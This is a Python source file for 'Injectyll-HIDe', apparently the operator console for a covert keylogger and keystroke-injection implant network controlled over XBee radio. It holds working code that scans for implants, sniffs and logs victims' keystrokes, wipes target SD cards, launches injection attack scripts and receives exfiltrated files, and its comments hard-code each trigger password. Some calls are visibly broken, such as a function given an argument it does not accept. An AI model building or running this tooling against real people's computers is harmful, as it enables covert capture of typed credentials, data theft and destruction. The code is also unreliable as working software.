#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#setup the host computer via https://xbplib.readthedocs.io/en/latest/getting_started_with_xbee_python_library.html

#password for keystroke tx = ce8hovfvemu@ap*B+H3s
#password for Disable keystrokes = ce8hovevemu@ap*B+H3s
#password for Enable insomnia = jorLwabocUqeq6bRof$2
#password for Disable insomnia = jorLwbbocUqeq6bRof$2
#password for Enable Recording = GatIQEMaNodE5L#p$T?l
#password for Disable Recording = GatlQEMaNodE5L#p$T?l
#The following passwords do not need a disable as they are not latching on the Arduino side.
#password for Enabling wipe = 4+aJu2+6ATRES+ef_OtR
#password for Enabling key injection = c01h2*+dIp?W3lpez*T=
#password for data exfil = s$en*zET0aYozE!l-Tu0

#---To Do ---     
#For production, change password from descriptive text values to passwords noted above       
#add toggle statuses for insomnia, key recording, keystroke transmission


import time, os
from digi.xbee.devices import XBeeDevice, RemoteXBeeDevice, XBee64BitAddress
from os import path


def initiate_xbee_device():
    com = input("Enter the com port for your xbee device (e.g. COM22): ")
    baud = input("Enter the target buad rate (e.g. 9600): ")
    try:
        dev = XBeeDevice(com, baud)
        return dev
    except Exception:
        print("There was an error with the submitted location\n")
        print("Please try again")
        
        
def scanner(t, d):
    xnet = d.get_network()
    print("\nInitiating scanner.  Please wait for 10 seconds.\n")
    #xnet.set_discovery_options({DiscoveryOptions.APPEND_DD, DiscoveryOptions.APPEND_RSSI})
    #set discovery time for 10 seconds
    xnet.set_discovery_timeout(10)  
    xnet.start_discovery_process()
    while xnet.is_discovery_running():
        time.sleep(0.5)
    # Get a list of the devices added to the network.
    device_list = xnet.get_devices()
    
    #print devices to file
    if path.exists('attackNodes.txt'):
        os.remove('attackNodes.txt')
    f = open('attackNodes.txt', 'w')
    f.write('---' + t +'---\n')
    print("DigiMesh devices found:")
    for i in device_list:
        print(i)
        f.write(str(i)+'\n')
    f.close()   


def rx_all(d, t): 
    #open file to record keystrokes, append time and date and record any received keystrokes
    f = open('recordKeystrokes.txt', 'a')
    f.write(t+"\n")
    while True:
        try:
            xbee_message = d.read_data()
            address = str(d)
            if xbee_message:
                msg = xbee_message.data
                print(address + msg.decode() +"\n")
                f.write(address + msg.decode() +"\n")
        except KeyboardInterrupt:
            print("\n\nReturning to previous menu\n")
            f.write("\n")
            f.close()
            break
            

def target_rx(d, t):  
    while True:
        try:
            # Instantiate a remote XBee device object.data
            remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg = xbee_message.data
                print(t + " >>> " + msg.decode() + "\n")
        except (KeyboardInterrupt, Exception) as e:
            print("An error was encountered connecting to the target. Returning back to the previous menu.")
            print(e)
            break


def target_tx(d, a, m):
    remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(a))
    d.send_data(remote_device, m)


def target_menu():
    print("\nPick your target:\n")
    print("0) Enter your own target address\n")
    count = 1
    f = open('attackNodes.txt', 'r')  
    target = []
    for i in f:
        if (str(i)[0] != '-' and str(i)[0] != '\n'):
            target.append(str(i)[0:16])
            print(str(count)+ ") " + str(i))
            count = count+1
    option = input("Choose target: ")
    if (option == '0'):
        return (input("Enter target address (e.g. 0013A20040XXXXXX): "))
    else:
        try:
            return target[int(option)-1]
        except Exception:
            print("There was an error with your selection.")
            print("Please try again")
            return(option)

    


def main_menu():
    print("")
    print("------Main Menu------")
    print("")
    print("Options:")
    print("1) Scan for Zigbee nodes")
    print("2) Sniff keystrokes")
    print("3) Disable keystroke transmission")
    print("4) Enable Insomnia mode")
    print("5) Disable Insomnia mode")
    print("6) Enable Keystroke Recorder")
    print("7) Disable Keystroke Recorder")
    print("8) Wipe target SD card")
    print("9) Launch attack from script")
    print("10) Receive data file")
    print("11) Exit\n")


def submenu_2(d, t):
    print("\n\n1) Sniff for all broadcast packets")
    print("2) Sniff packets from target address\n")
    option = input("Choose function: ")
    if option == '1':
        print("\nCtrl+C to exit Sniffing Loop")
        print("\nSending broadcast message to activate sniffing")
        try:
            #broadcast password to trigger keystroke transmission
            d.send_data_broadcast("Start sniffing")
            #send out command to start keystroke sniffing
            rx_all(d, t)
        except (KeyboardInterrupt, Exception) as e:
            #disabling keystroke transmission since we are no longer attached
            #password for Disable keystrokes = ce8hovevemu@ap*B+H3s
            d.send_data_broadcast("Stop transmission password")
            print("\n" + e + "\n")
    elif option == '2':
        target = target_menu()
        try:
            print("\nTarget: " + target)
            target_tx(d,target, "Start Sniffing")
            target_rx(d, target)
        except Exception:
            print("There was an error with the submitted address")
            print("Please try again")
            #disable transmission of keystrokes
            #password for Disable keystrokes = ce8hovevemu@ap*B+H3s
            target_tx(d,target, "Stop transmission password")
            
    else:
        print("Invalid selection.  Please try again!")
        
        
def submenu_toggle(d, m1, m2, m_out):
    print("\n\n1) " + m1)
    print("2) " + m2 + '\n')
    option = input("Choose function: ")
    if option == '1':
        print("\nSending broadcast message")
        #broadcast password to trigger keystroke transmission
        d.send_data_broadcast(m_out)
    elif option == '2':
        target = target_menu()
        try:
            print("\nTarget: " + target)
            print("\nSending message")
            target_tx(d,target, m_out)
        except Exception:
            print("There was an error with the submitted address")
            print("Please try again")
    else:
        print("Invalid selection.  Please try again!")
        
        
def submenu_launch_script(d, m1, m2, n, p):        
    print("\n\n1) " + m1)
    print("2) " + m2 + '\n')
    option = input("Choose function: ")
    if option == '1':
        print("\nSending broadcast message")
        #broadcast password to enable launch script
        d.send_data_broadcast(p)
        #give a chance for the target to process password
        time.sleep(2)
        #send script name to launch
        d.send_data_broadcast(n)
    elif option == '2':
        target = target_menu()
        try:
            print("\nTarget: " + target)
            print("\nSending message")
            #send password to enable launch script
            target_tx(d,target, p)
            #give a chance for the target to process password
            time.sleep(2)
            #send script name to launch
            target_tx(d,target, n)
        except Exception:
            print("There was an error with the submitted address")
            print("Please try again")
    else:
        print("Invalid selection.  Please try again!")        
        
def submenu_scripts(d, p):
    print("This section is under devolopment and is non-functional")
    print("\n\n1) Attack Script #1")
    print("2) Attack Script #2")
    print("3) Etc.\n")
    option = input("Choose script: ")
    if option == '1':
        submenu_launch_script(d, "Launch attack on all devices", "Launch attack on target", p, "attackFile.txt")
    elif option == '2':
        submenu_launch_script(d, "Launch attack on all devices", "Launch attack on target", p, "attackFile.txt")
    elif option == '3':
        submenu_launch_script(d, "Launch attack on all devices", "Launch attack on target", p, "attackFile.txt")
    else:
        print("\nYou did not choose a valid option")
        

def submenu_file(d):
    print("Choose which device to receive file from.")
    t = target_menu()
    name = input("Enter file name with extension: ")
    f = open(name, 'w')
    while True:
        try:
            # Instantiate a remote XBee device object.data
            remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg = xbee_message.data
                f.write(msg.decode())
        except (KeyboardInterrupt, Exception) as e:
            f.close()
            print("User either stopped the process or there was an error.")
            break



def banner():
    print(" ______                                          __                __  __          __    __  ______  _______            ")
    print("/      |                                        /  |              /  |/  |        /  |  /  |/      |/       \           ")
    print("$$$$$$/  _______       __   ______    _______  _$$ |_    __    __ $$ |$$ |        $$ |  $$ |$$$$$$/ $$$$$$$  |  ______  ")
    print("  $$ |  /       \     /  | /      \  /       |/ $$   |  /  |  /  |$$ |$$ | ______ $$ |__$$ |  $$ |  $$ |  $$ | /      \ ")
    print("  $$ |  $$$$$$$  |    $$/ /$$$$$$  |/$$$$$$$/ $$$$$$/   $$ |  $$ |$$ |$$ |/      |$$    $$ |  $$ |  $$ |  $$ |/$$$$$$  |")
    print("  $$ |  $$ |  $$ |    /  |$$    $$ |$$ |        $$ | __ $$ |  $$ |$$ |$$ |$$$$$$/ $$$$$$$$ |  $$ |  $$ |  $$ |$$    $$ |")
    print(" _$$ |_ $$ |  $$ |    $$ |$$$$$$$$/ $$ \_____   $$ |/  |$$ \__$$ |$$ |$$ |        $$ |  $$ | _$$ |_ $$ |__$$ |$$$$$$$$/ ")
    print("/ $$   |$$ |  $$ |    $$ |$$       |$$       |  $$  $$/ $$    $$ |$$ |$$ |        $$ |  $$ |/ $$   |$$    $$/ $$       |")
    print("$$$$$$/ $$/   $$/__   $$ | $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$ |$$/ $$/         $$/   $$/ $$$$$$/ $$$$$$$/   $$$$$$$/ ")
    print("                /  \__$$ |                              /  \__$$ |                                                      ")
    print("                $$    $$/                               $$    $$/                                                       ")
    print("                 $$$$$$/                                 $$$$$$/                                                        \n")
    print("\n")
    print("Injectyll-HIDe version 0.95")
    print("Created on: 10\21\20")
    print("Created by Jonathan Fischer and Jeremy Miller\n\n")


def loop():
    localtime = time.asctime(time.localtime(time.time()))
    banner()  
    device = initiate_xbee_device()
    device.open()

    while True:
        main_menu()
        try:
            option = input("Choose your function: ")
        except KeyboardInterrupt:
            print("\n\nExiting Injectyll-HIDe\n")
            device.close()
            exit()

        if option == '0':
            print("\n\nEnter Option #6 to exit Injectyll-HIDe\n")
        elif option == '1':
            scanner(localtime, device)
        elif option == '2':
            #password for keystroke tx = ce8hovfvemu@ap*B+H3s
            submenu_2(device, localtime)
        elif option == '3':
            #password for Disable keystrokes = ce8hovevemu@ap*B+H3s
            #The user shouldn't need this option as the transmission disable message should be sent when exiting from the rx menu
            #However, it is included in the event that there is a scenario that is unaccounted for
            submenu_toggle(device, "Disable all keystroke transmissions", "Disable keystroke transmission from target", "Disable keystroke transmission password")
        elif option == '4':
            #password for Enable insomnia = jorLwabocUqeq6bRof$2
            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", "Drink coffee password")
        elif option == '5':
            #password for Disable insomnia = jorLwbbocUqeq6bRof$2
            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", "Sleep password")
        elif option == '6':
            #password for Enable Recording = GatIQEMaNodE5L#p$T?l
            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", "Record keystrokes password")
        elif option == '7':
            #password for Disable Recording = GatlQEMaNodE5L#p$T?l
            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", "Disable recording password")
        elif option == '8':
            #password for Enabling wipe = 4+aJu2+6ATRES+ef_OtR
            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", "Wipe SD Card password")
        elif option == '9':
            #password for Enabling key injection = c01h2*+dIp?W3lpez*T=
            submenu_scripts(device, "Launch script password")
        elif option == '10':
            #password for data exfil = s$en*zET0aYozE!l-Tu0
            submenu_file(device, "Receive file password")
        elif option == '11':
            device.close()
            exit()
        else:
            print("\nYou did not choose a valid option")


if __name__ == '__main__':
    loop()
